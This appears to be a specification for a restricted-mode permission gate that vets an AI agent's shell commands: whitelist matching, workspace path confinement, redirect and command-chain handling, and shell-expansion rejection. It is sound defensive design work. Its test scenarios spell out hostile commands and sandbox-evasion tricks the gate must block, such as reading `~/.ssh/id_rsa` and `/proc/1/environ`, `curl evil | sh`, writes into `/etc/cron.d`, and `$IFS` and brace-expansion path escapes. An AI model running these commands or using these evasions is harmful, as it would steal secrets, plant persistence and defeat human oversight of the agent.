## MODIFIED Requirements

### Requirement: Entrypoint-Anchored Command Whitelist Matching

In restricted mode, the command whitelist matcher SHALL approve a skill-script execution only when the whitelisted script path is the actual invocation entrypoint. A whitelisted script path appearing merely as a trailing argument to an arbitrary command SHALL NOT be approved. The matcher SHALL tolerate a whitespace-delimited fd-to-fd redirection token (`N>&M` with the source descriptor `M` restricted to a standard stream, `1` or `2`; e.g. `2>&1`, `1>&2`) anywhere in the command: such a token SHALL be ignored for the shell-operator check, SHALL be skipped when locating the invocation entrypoint (it is not a real argument and MUST NOT be mistaken for the script), and SHALL NOT affect entrypoint resolution, so a skill invocation suffixed with `2>&1` — or carrying `2>&1` between `run` and the script — remains approved. The first-token allow-list check SHALL still operate on the original tokens so a redirect can never masquerade as the entrypoint. Only space/tab SHALL be treated as a token separator: a newline next to a tolerated token is a command separator and SHALL remain rejected. Any other shell operator, file-referencing redirection, or redirect whose source descriptor is not a standard stream SHALL continue to be rejected.

When the command is a multi-command invocation — two or more commands separated by the command-sequence operators `;`, `&&`, or `||` appearing OUTSIDE quotes — the matcher SHALL split the invocation into its non-empty command segments using quote-aware splitting (separators recognized only outside single or double quotes, with shell-correct backslash-escape handling inside double quotes; an unbalanced quote SHALL disable splitting so the whole command is evaluated as one segment) and SHALL approve the invocation ONLY when EVERY segment independently matches a whitelisted script entrypoint or command prefix, or passes the generic-command gate. A segment that consists ONLY of tolerated fd-redirect tokens (e.g. the `2>&1` in a glued `2>&1&&cat ...`) SHALL be rejected as an operator artifact (`shell_operator`), never skipped. The D5 legacy free-text flag check (`--message` / `--content` / `--query` / `--caption`) SHALL remain on the full original command, not per segment. Single-segment commands SHALL be evaluated exactly as before.

#### Scenario: Legitimate skill invocation approved

- **GIVEN** a command `deno run <flags> skills/memory-save/scripts/memory-save.ts <args>` where the script path is the entrypoint positional
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL approve the command

#### Scenario: Skill invocation with trailing fd-to-fd redirect approved

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run skills/memory-save/scripts/memory-save.ts --content-file $TMPDIR/$SESSION_ID/x.md 2>&1`
- **THEN** it SHALL approve the command because the entrypoint is the whitelisted script and the trailing `2>&1` token only duplicates file descriptor 1

#### Scenario: Multi-command chain of skill commands approved

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser --args "--no-sandbox" open "https://example.com" 2>&1; agent-browser --args "--no-sandbox" get text 2>&1`
- **THEN** the gate SHALL approve the invocation because every segment independently matches the `agent-browser` command prefix with only a tolerated `2>&1` fd-redirect token

#### Scenario: Chain with a non-whitelisted segment rejected

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser open https://example.com || echo fallback`
- **THEN** the gate SHALL reject the invocation because the `echo fallback` segment matches no whitelist entry, its first token is not on the generic allow-list, and the whole call fails when any segment fails

#### Scenario: Quoted separator is not a splitting boundary

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser fill @e2 "some; text"`
- **THEN** the matcher SHALL treat the command as a single segment and approve it (the `;` is inside double quotes)

#### Scenario: Redirect-only segment rejected as operator artifact

- **GIVEN** a restricted-mode session with `agent-browser` on the command-prefix whitelist
- **WHEN** the agent requests `agent-browser 2>&1&&cat /etc/passwd` or `2>&1; cat /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL reject the invocation with `shell_operator` because a segment consists only of tolerated fd-redirect tokens and is an operator artifact, never a command

#### Scenario: Arbitrary command with whitelisted script as trailing argument rejected

- **GIVEN** a command whose first token is an arbitrary binary (e.g. `tar`, `cat`) and whose trailing argument is a whitelisted script path (e.g. `cat /home/deno/.git-credentials skills/memory-save/scripts/memory-save.ts`)
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL NOT approve the command

#### Scenario: Command-prefix skill with out-of-workspace path argument rejected

- **GIVEN** a command whose first token matches a whitelisted command prefix but whose arguments reference a path outside the workspace
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL NOT approve the command

### Requirement: Generic-Command Workspace Confinement

The restricted-mode ACP permission gate SHALL approve a generic bash command (a command whose first token is on an explicit allow-list) ONLY when every path-like argument — both inputs and outputs — resolves inside the session workspace, the session TMPDIR, the agent workspace, or the session-scoped OpenCode tool-output directory, AND the command contains no code-execution / arbitrary-target argument flag (e.g. `find -exec`/`-delete`/`-fprintf`, `rg --pre`). A command referencing any path outside those boundaries (as a read source OR a write/output target), or using such a flag, SHALL be rejected. The shared, home-rooted OpenCode tool-output directory (`$HOME/.local/share/opencode/tool-output` or any other home-rooted location) SHALL NOT be within bounds.

A generic command SHALL be rejected when it contains shell operators that enable command chaining or file redirection (`;`, `|`, `&`, backtick, `$()`, `>`, `<`, `#`, newline), with the following exception: the command-sequence operators `;`, `&&`, and `||` SHALL NOT by themselves reject a multi-command invocation. A multi-command invocation SHALL be split into its non-empty command segments using quote-aware splitting (separators recognized only outside single or double quotes, with shell-correct backslash-escape handling inside double quotes; an unbalanced quote SHALL disable splitting so the whole command is evaluated as one segment; a command containing no separator SHALL be evaluated exactly as today) and SHALL be approved ONLY when EVERY segment independently satisfies this requirement — first token on the allow-list, no dangerous flag, every path argument in-bounds, and no residual shell operator (subject to the fd-to-fd exception below). A segment that consists ONLY of tolerated fd-redirect tokens SHALL be rejected as an operator artifact (`shell_operator`), never skipped. The whole invocation SHALL be rejected when ANY segment fails, and the rejection SHALL report the FIRST failing segment's cause. Pipes `|`, backgrounding `&`, and newline separators SHALL NOT be splitting boundaries; a command containing them SHALL be rejected.

An exception SHALL apply to a whitespace-delimited argument token that is EXACTLY `N>&M`, where `N` is one-or-more decimal digits and `M` is the descriptor of a standard stream (`1` or `2`; e.g. `2>&1`, `1>&2`, `3>&1`): such a token duplicates an already-open standard output/error stream and references no path on disk, so it SHALL be removed from the shell-operator check and SHALL NOT be treated as a path argument. The removal SHALL treat only space/tab as a token separator — a newline next to a tolerated token is a shell command separator, NOT a token boundary, so the filtered command SHALL retain the newline and SHALL be rejected. Any other redirection form SHALL remain rejected, including redirects to a file (`2>/dev/null`, `2>/tmp/x`, `> file`), `>&word` with a non-numeric `word`, digit-prefixed filenames (`2>&1/tmp/x`, `2>&1x`) which a shell opens for writing, and redirects whose source descriptor is not a standard stream (`1>&3`, `2>&3`, `9>&99`) — these are not exact `N>&[12]` tokens and remain subject to the shell-operator and path-containment rejections.

Home-anchored argument tokens SHALL be expanded against the runtime values before the containment check: the exact forms `~`, `~/...`, `$HOME`, `$HOME/...`, `${HOME}`, `${HOME}/...` SHALL expand the `~`/`$HOME` reference to the runtime home directory, and `$XDG_DATA_HOME`, `$XDG_DATA_HOME/...`, `${XDG_DATA_HOME}`, `${XDG_DATA_HOME}/...` SHALL expand to the session's `XDG_DATA_HOME` value. Expansion SHALL be applied to the token after quote stripping and `--flag=value` splitting, including inside attached option values (e.g. `-o$HOME/...`), so an attached option carrying an expanded absolute path is subject to the same attached-absolute-path rejection as a literal one. The containment check SHALL be applied to the expanded path, so a token that expands outside an allowed directory (e.g. `~/.ssh/id_rsa`, `$HOME/.git-credentials`, `$HOME/../etc/passwd`, `-o$HOME/.ssh/x`) SHALL be rejected. Any other home-anchored token (e.g. `~otheruser/...`, `~notexpanded`) SHALL be rejected.

Attached short-option values SHALL be rejected when they are absolute or traversal-anchored: a `-`-prefixed token whose glued value starts with `/` or `..`, or contains `/../` (e.g. `-o/etc/cron.d`, `-f../sibling-user/file`, `-o../x`, `-oout/../x`), SHALL be rejected — such values resolve against the agent's cwd and escape the workspace. Bare flags (`-r`) and safe attached values (`-n5`, `-fprogram.jq`) SHALL pass.

A path argument that resolves inside the session's OpenCode data area (`{sessionWorkspace}/tmp/opencode-data`) but OUTSIDE the session's own data home SHALL be rejected even though it lexically resolves inside the session workspace: sibling/previous sessions' truncated tool outputs (and the data-area root listing that would enumerate them) are never within bounds, while the session's own data home remains readable.

The allow-list SHALL be limited to plain search/read/stat utilities whose only file access is via ordinary path arguments the lexical check can see — i.e. `rg`, `cat`, `head`, `tail`, `ls`, `find`, `wc`, `file`, `tree`, `jq`, `pdftotext`, `pdfinfo`, `pdfimages`, `pdftoppm`. Tools that read or write files through their own argument DSL, an argument/response indirection file, an embedded protocol/coder, or a filter/preprocessor that executes code (e.g. ImageMagick `magick`/`convert`/`identify`/`mogrify` via `caption:@`/`label:@`/`msl:` coders, `exiftool -@` argfiles, `ffmpeg`/`ffprobe` protocols like `-f lavfi -i movie=`, `pandoc --lua-filter`, and the `unzip`/`zip`/`7zz` archive tools via attached `-o` output or archive path traversal) SHALL NOT be on the allow-list, because a lexical path check cannot bound them; they are only safe under the filesystem confinement (D4) and remain default-deny at this gate until it is active. Interpreters and mutating system tools (e.g. `python`, `git`, `rm`, `mv`, `dd`, `chmod`, `mkdir`) SHALL NOT be on the allow-list and SHALL remain default-deny.

#### Scenario: In-workspace generic command approved

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `rg pattern /app/data/workspaces/discord/123/` or `head /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session workspace

#### Scenario: Chained generic commands all in-workspace approved

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 2>&1; ls -la /app/data/workspaces/discord/123/tmp/`
- **THEN** the gate SHALL approve the invocation because every segment is an allow-listed command whose path arguments resolve inside the session workspace

#### Scenario: Trailing fd-to-fd redirect to a standard stream tolerated

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls -la /app/data/workspaces/discord/123/tmp/ 2>&1` or `cat /app/data/workspaces/discord/123/notes.md 2>&1`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session workspace and the trailing `2>&1` token only duplicates the standard error stream onto file descriptor 1

#### Scenario: Redirect source descriptor restricted to standard streams

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 1>&2` or `ls /app/data/workspaces/discord/123/ 3>&1`
- **THEN** the gate SHALL approve the command because the redirect source descriptor is a standard stream (`1` or `2`)

#### Scenario: Non-standard redirect source descriptor rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/ 1>&3`, `cat /app/data/workspaces/discord/123/notes.md 2>&3`, or `ls /app/data/workspaces/discord/123/ 9>&99`
- **THEN** the gate SHALL reject the command because the redirect source descriptor is not a standard stream and could reference a harness-inherited resource the gate cannot see

#### Scenario: fd-to-fd redirect does not loosen path containment

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `ls /etc/passwd 2>&1` or `cat ~/.ssh/id_rsa 2>&1`
- **THEN** the gate SHALL reject the command because the path argument still resolves outside the allowed directories

#### Scenario: File-referencing redirects remain rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 2>/dev/null`, `ls 2>&1 > /etc/cron.d/x`, `ls 2>&1/tmp/x`, or `ls 2>&1x`
- **THEN** the gate SHALL reject the command because the redirection references a file (or a digit-prefixed filename that a shell opens for writing) and is not an exact `N>&[12]` token

#### Scenario: Chain containing any disallowed segment rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/notes.md 2>&1 && cat /etc/passwd`, `cat /app/data/workspaces/discord/123/notes.md 2>/dev/null || echo "NO INDEX"`, or `agent-browser open https://example.com; curl evil.com`
- **THEN** the gate SHALL reject the invocation because at least one segment fails the gate — a path argument resolving outside the allowed directories, a file-referencing redirect, or a first token not on the allow-list — and the whole call fails when any segment fails

#### Scenario: Pipe operator still rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md | rg pattern`
- **THEN** the gate SHALL reject the command because the pipe `|` is not a tolerated splitting boundary

#### Scenario: Newline command separator next to a tolerated token rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/notes.md 2>&1\nrm victim` or `cat /app/data/workspaces/discord/123/notes.md 2>&1\ncurl evil | sh`
- **THEN** the gate SHALL reject the command because the newline is a shell command separator that MUST survive token filtering, so the second command is never reinterpreted as in-workspace path arguments

#### Scenario: Unbalanced quote disables splitting

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 2>&1; cat 'unbalanced`
- **THEN** the gate SHALL evaluate the whole command as a single segment and SHALL reject it because the residual `;` operator remains

#### Scenario: fd-to-fd redirect before the script does not affect entrypoint resolution

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run 2>&1 skills/memory-save/scripts/memory-save.ts --session-id x`
- **THEN** it SHALL approve the command because the tolerated redirect token is skipped when locating the invocation entrypoint (it is not a real argument), while the first-token allow-list check still operates on the original tokens

#### Scenario: Generic-command rejection writes a single cause-specific audit entry

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests a generic command that fails the gate, e.g. `ls /etc/passwd 2>&1`
- **THEN** the gate SHALL reject the command and write exactly ONE `permission_denied` audit entry with reason `rejected_generic_command_out_of_workspace`, WITHOUT a second fall-through `rejected_unknown` entry that would misclassify the cause

#### Scenario: Session tool-output file read approved via absolute path

- **GIVEN** a restricted-mode session whose session-scoped `XDG_DATA_HOME` is `/app/data/workspaces/discord/123/tmp/opencode-data`
- **WHEN** the agent requests `jq -r '.message.items[0].abstract, "---", .message.items[0].title[0]' /app/data/workspaces/discord/123/tmp/opencode-data/opencode/tool-output/tool_ff80f6564001UdX4UoUmlKdpjY`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session tool-output directory

#### Scenario: Session tool-output file read approved via XDG_DATA_HOME reference

- **GIVEN** a restricted-mode session whose session-scoped `XDG_DATA_HOME` is `/app/data/workspaces/discord/123/tmp/opencode-data`
- **WHEN** the agent requests `cat $XDG_DATA_HOME/opencode/tool-output/tool_x` or `cat ${XDG_DATA_HOME}/opencode/tool-output/tool_x`
- **THEN** the gate SHALL expand the reference and approve the command because the expanded path resolves inside the session tool-output directory

#### Scenario: Shared home-rooted tool-output directory never within bounds

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat ~/.local/share/opencode/tool-output/tool_x`, `cat $HOME/.local/share/opencode/tool-output/tool_x`, or `cat /home/deno/.local/share/opencode/tool-output/tool_x`
- **THEN** the gate SHALL reject the command because the shared home-rooted tool-output directory is not within bounds

#### Scenario: Home-anchored sensitive file still rejected

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat ~/.ssh/id_rsa`, `cat $HOME/.git-credentials`, `cat $HOME/../etc/passwd`, `cat '${HOME}/.ssh/known_hosts'`, or `cat -o$HOME/.ssh/x`
- **THEN** the gate SHALL reject the command because the expanded path resolves outside every allowed directory or is an attached absolute path

#### Scenario: Attached short-option traversal rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `jq -f../other-user/program.jq data.json`, `pdftoppm in.pdf -o../x`, or `rg -f/../etc/passwd .`
- **THEN** the gate SHALL reject the command because the glued option value is absolute or traversal-anchored and would escape the workspace
- **AND** `jq -fprogram.jq data.json` and `head -n5 notes.md` SHALL be approved (bare flags and safe attached values)

#### Scenario: Unexpandable home-anchored token rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `cat ~otheruser/notes.md` or `cat ~notexpanded/file`
- **THEN** the gate SHALL reject the command because the home-anchored token is not in an expandable form

#### Scenario: Out-of-workspace read rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `rg -a "" /proc/1/environ`, `head -c 2000 /proc/1/environ`, or `head /app/data/workspaces/discord/<otherUser>/memory.private.jsonl`
- **THEN** the gate SHALL reject the command with logging because a path argument resolves outside the allowed directories

#### Scenario: Out-of-workspace output target rejected

- **GIVEN** a restricted-mode session and an allow-listed tool that writes an output file (e.g. `pdftoppm`, `pdfimages`)
- **WHEN** the agent requests an out-of-workspace output path, e.g. `pdftoppm in.pdf /etc/cron.d/evil` or `pdftoppm in.pdf ~/.ssh/authorized_keys`
- **THEN** the gate SHALL reject the command because the output path resolves outside the allowed directories

#### Scenario: File-DSL / indirection tool not covered by the allow-list

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests a tool whose argument DSL can reach arbitrary files, e.g. `magick -size 400x100 caption:@/proc/1/environ tmp/leak.png`, `exiftool -@ tmp/args.txt`, `ffmpeg -f lavfi -i movie=/etc/passwd out.mp4`, or `7zz x a.7z -o/etc/cron.d/`
- **THEN** the allow-list SHALL NOT approve it (the tool is excluded from the allow-list; it is only safe under D4 confinement)

## ADDED Requirements

### Requirement: Shell-Expansion Token Rejection

The per-token path checks of the ACP permission gate (the generic-command gate's `genericArgWithinWorkspace` and the skill matchers' `referencesOutOfWorkspacePath`) SHALL reject argument tokens whose runtime shell expansion could resolve outside the allowed directories. Only a fixed set of harness-set variables SHALL be expandable: `$HOME`/`${HOME}`, `$XDG_DATA_HOME`/`${XDG_DATA_HOME}` (expanded and containment-checked in the generic gate as today), and `$TMPDIR`/`${TMPDIR}`, `$AGENT_WORKSPACE`/`${AGENT_WORKSPACE}`, `$SESSION_ID`/`${SESSION_ID}` (in the generic gate these SHALL be expanded and containment-checked; in the skill matchers they SHALL be recognized as known variables without expansion, preserving the `--content-file $TMPDIR/$SESSION_ID/x.md` payload contract). Every other UNQUOTED `$VAR`/`${VAR}` reference SHALL be rejected, because an unquoted expansion can be word-split into an out-of-workspace path (e.g. `$IFS/etc/passwd`). A `$` reference inside single quotes is literal and SHALL be allowed. A double-quoted `$VAR`/`${VAR}` reference to a non-harness variable SHALL be rejected when it BEGINS the token's path content (e.g. `"$X/etc/passwd"`, `"$X"`, `"$_"`, `--flag="$X"`): a quoted expansion is not word-split, but an UNSET variable expands to empty, and an empty expansion followed by a literal `/...` or `..` suffix IS an absolute/traversal path (a set variable can also carry an absolute value directly). A double-quoted reference EMBEDDED after literal text (`"price $X"`, `"a$X"`) SHALL be allowed: a literal prefix keeps the expanded result relative. Any unquoted brace-expansion token (`{...}` — e.g. `{safe,/etc/passwd}`) SHALL be rejected, since brace expansion can enumerate out-of-workspace paths. A `--flag=` prefix SHALL be normalized away before the scan so an attached-option value is judged on its own path content.

#### Scenario: Unquoted unknown variable rejected

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat $IFS/etc/passwd`, `cat ${OTHER}/etc/shadow`, or `cat $VAR/../etc/passwd`
- **THEN** the gate SHALL reject the command because the token contains an unquoted `$VAR` reference that is not a harness-set variable and could expand to an out-of-workspace path

#### Scenario: Harness-set variables expanded and containment-checked

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`, `TMPDIR=/app/data/workspaces/discord/123/tmp`, and `AGENT_WORKSPACE=/app/data/agent-workspace`
- **WHEN** the agent requests `cat $TMPDIR/scratch.txt`, `cat $AGENT_WORKSPACE/notes/_index.md`, or `cat $XDG_DATA_HOME/opencode/tool-output/tool_x`
- **THEN** the gate SHALL expand the variable and approve the command because the expanded path resolves inside the session workspace, the agent workspace, or the session tool-output directory

#### Scenario: Quoted dollar references allowed

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `rg 'cost is $5' /app/data/workspaces/discord/123/notes.md` or `rg "price $X" /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL approve the command because the `$` references are inside quotes (single-quoted literals; embedded double-quoted references whose literal prefix keeps the expansion relative)

#### Scenario: Double-quoted reference at token start rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat "$X/etc/passwd"`, `cat "$X"`, `cat "$_"`, or `cat --file="$X/etc/passwd"`
- **THEN** the gate SHALL reject the command because the double-quoted non-harness reference begins the token's path content: an unset variable expands to empty (exposing the literal `/etc/passwd` as absolute) and a set variable can carry an absolute path value

#### Scenario: Unquoted brace expansion rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `cat {safe,/etc/passwd}` or `cat {/etc/passwd}`
- **THEN** the gate SHALL reject the command because the token contains an unquoted brace-expansion expression that could enumerate out-of-workspace paths

#### Scenario: Skill payload variables keep working

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts` and a session with `TMPDIR`/`SESSION_ID` set
- **WHEN** the matcher evaluates `deno run skills/memory-save/scripts/memory-save.ts --content-file $TMPDIR/$SESSION_ID/x.md --session-id x`
- **THEN** it SHALL approve the command because `$TMPDIR`/`$SESSION_ID` are known harness-set variables in the skill matcher and the entrypoint is the whitelisted script
